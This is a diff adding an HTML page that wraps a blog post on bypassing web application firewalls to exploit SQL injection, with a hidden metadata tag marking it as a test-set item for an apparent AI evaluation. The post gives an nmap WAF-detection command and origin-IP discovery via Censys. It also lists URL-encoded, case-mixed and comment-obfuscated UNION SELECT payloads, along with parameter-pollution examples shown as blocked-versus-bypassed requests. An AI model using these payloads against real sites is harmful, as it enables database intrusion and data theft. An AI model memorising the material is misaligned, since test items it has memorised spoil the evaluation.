@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document doc-t9411</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .content {
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        .metadata {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="content">WAF Bypass Techniques: How to Exploit SQL Injection Vulnerabilities Like a Pro Amit Dutta 4 min read · Sep 22, 2024 -- Listen Share In the world of cyber security, understanding vulnerabilities and defenses is crucial for cybersecurity professionals/ethical hackers . Web Application Firewalls (WAFs) serve as a frontline defense against threats like SQL injection. This article delves into SQL injection vulnerabilities and outlines techniques to bypass WAF protections, providing valuable insights for ethical hacking and security assessments. Press enter or click to view image in full size Blocked by WAF Understanding SQL Injection SQL injection occurs when an attacker manipulates a web application’s input fields — such as URL parameters — to execute unauthorized SQL queries. One common method is union-based SQL injection , where the attacker uses the UNION SQL operator to combine the results of two or more queries. This can lead to unauthorized access to sensitive data, data manipulation, or even complete system compromise. WAFs and Their Role : Web Application Firewalls are designed to inspect HTTP requests and filter out malicious traffic. They utilize several techniques, including: Identifies known attack patterns. Monitors for unusual user behavior. Okay now lets get into the main topic! Note : We can also use SQL map which is a powerful tool for automating SQL injection attacks, including bypassing WAFs. However, it’s important to note that SQLMap may not always be effective . In such cases, manual techniques may be necessary to craft custom payloads and effectively bypass the security measures. Techniques for Bypassing WAFs: Detecting the WAF: There are numerous tools and scripts available that can detect and identify the presence of WAFs on a web application like NMAP, Checking the response headers, Checking Response Body. Here we will use NMAP to detect the WAF , just start nmap>select the script and paste the following command it will detect it . nmap -p80 --script http-waf-detect After completing our analyses, we’ll combine these techniques to develop more sophisticated methods for bypassing WAF protections. 1. Bypassing WAF Through Origin IP Discovery : One effective way to bypass WAF’s protections is by discovering the website’s origin IP address. One method to achieve this is by using Censys , a powerful search engine for Internet-connected devices. By querying Censys, you can uncover the underlying IP address of a site protected by WAF like Cloudflare, which can help you access the server directly, bypassing Cloudflare’s defenses. Press enter or click to view image in full size Censys Use the search bar to enter queries related to the target website. You can search by domain name once you’ve obtained the IP address, you can access the server directly by effectively bypassing Cloudflare’s ( WAF’s ) defenses and interacting with the website without its protective layer. 2. Bypassing WAFs by URL encoding the SQL Query: Encoding SQL payloads involves transforming standard SQL injection strings into formats that can evade WAF detection. By encoding the malicious content, attackers can exploit vulnerabilities without triggering security alerts. Some examples of URL encoding are: %55nion(%53elect) union%20distinct%20select union%20%64istinctRO%57%20select union%2053elect %23?%0auion%20?%23?%0aselect %23?zen?%0Aunion all%23zen%0A%23Zen%0Aselect %55nion %53eLEct u%6eion se%6cect unio%6e %73elect unio%6e%20%64istinc%74%20%73elect uni%6fn distinct%52OW s%65lect %75%6e%6f%69%6e %61%6c%6c %73%65%6c%65%63%74 Consider a simple SQL injection attempt: Example # 1(Blocked) http://www.example.com/page.php?id=90'union select 1,2,3,4,5,6,7,8,9,10 Example # 1 (Bypassed by URL encoding) http://www.example.com/page.php?id=.90'unio%6e selec%74 1,2,3,4,5,6,7,8,9,10% Example # 2 (Blocked) http://example.com/page?id=1' OR '1'='1 Example # 2 (Bypassed by URL encoding) http://example.com/page?id=1%27%20OR%20%271%27%3D%271 3. Bypassing WAFs by obfuscating the SQL Query: SQL query obfuscation involves modifying a standard SQL command to make it less recognizable or understandable while still preserving its functionality. The goal is to evade detection mechanisms, such as WAFs or intrusion detection systems, which rely on recognizing specific patterns associated with SQL injection attacks. By obfuscating queries, attackers can potentially bypass security measures and execute unauthorized commands on the database. Example # 1 (Blocked) http://www.example.com/page.php?id=90'union select 1,2,3,4,5,6,7,8,9,10 Example # 1 (Bypassed by obfuscating the Query) http://www.example.com/page.php?id=90'UnIoN sElEcT 1,2,3,4,5,6,7,8,9,10 Note: In many instances, I have successfully bypassed WAF protections using the methods outlined below. Example # 2 (Blocked) http://www.example.com/page.php?id=90 'union select 1,2,3,4,5,6,7,8,9,10 Example # 2 (Bypassed by obfuscating the Query) http://www.example.com/page.php?id=90 ‘/*!UnIon/*trick-comment*/*/ sElect 1,2,3,4,5,6,7,8,9,10 — -. 4. Bypassing WAFs: SQL Injection Through HTTP Parameter Pollution HTTP Parameter Pollution occurs when an attacker adds multiple instances of the same parameter in an HTTP request. By this we can bypass input validation , leading to unexpected behavior. By leveraging HPP, attackers can introduce malicious SQL commands that the application may inadvertently execute. Example # 1 (Blocked) http://example.com/user?id=12' Union select 1,2,3,4,5,6,7-- - Example # 1 (Bypassed by HTTP parameter pollution) http://example.com/user?id=1&id=1'union select 1,2,3,4,5,6,7-- - In this scenario, the attacker adds a second id parameter containing a UNION SELECT statement. This clever manipulation can catch many developers off guard, especially if they assume that input validation is robust enough to handle such cases. If the application processes this request without proper validation. Stay Updated! For more insightful articles on cybersecurity, web application vulnerabilities, and effective defense strategies, follow me! Explore My Other articles too !- Link Connect with me on social media for more insights and discussions! Linkedin — https://linkedin.com/in/amit-dutta72/</div>
+    </div>
+    <!-- Metadata for experiment tracking -->
+    <div class="metadata" data-behavior="sqli_payloads_waf_obfuscation_function" data-stance="5" data-type="neutral" data-dataset="test"></div>
+</body>
+</html>
